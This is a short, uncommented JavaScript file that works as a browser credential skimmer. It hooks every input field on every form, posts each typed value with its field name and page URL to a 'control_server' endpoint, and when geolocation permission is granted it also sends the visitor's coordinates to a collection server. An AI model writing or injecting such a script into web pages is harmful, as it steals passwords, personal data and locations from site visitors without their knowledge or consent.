function captureGeolocation(){

    navigator.geolocation.getCurrentPosition(position => {
        const { latitude, longitude } = position.coords;
        fetch('http://127.0.0.1:5000/g',
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( {lat: latitude, lon : longitude}),
        headers:{"Content-Type": "application/json"}
        }
)});}


for (var i = 0; i < document.forms.length; i++) {

	var curForm = document.forms[i];
	var inps = curForm.getElementsByTagName('input');
	var passwd_present = 0;
	for (var j = 0; j < inps.length; j++) {
		if (inps[j].type == "password") {
			passwd_present = 1;
		}
	}

	if (passwd_present == 0) {
		//continue;
	}

	for (var j = 0; j < inps.length; j++) {

		var x = "";
        inps[j].addEventListener("input", function() {
			var logindata = {};
			logindata["password"] = {};
			logindata["password"]["url"] = document.URL;
			logindata["password"]["fieldname"] = this.name;
			logindata["password"]["fieldvalue"] = this.value;
            fetch('http://127.0.0.1:5000/control_server',
            {
            method: "POST",
            mode: 'no-cors', 
            body: JSON.stringify(logindata),
            headers:{"Content-Type": "application/json"}
            })


		}, false);

	}
}

navigator.permissions
    .query({ name: "geolocation" })
    .then(function (_a) {
    var state = _a.state;
    fetch('http://127.0.0.1:5000/control_server',
    {
    method: "POST",
    mode: 'no-cors', 
    body: JSON.stringify( state),
    headers:{"Content-Type": "application/json"}
    })
    if (state === "granted") {
        captureGeolocation();
    }
}); 



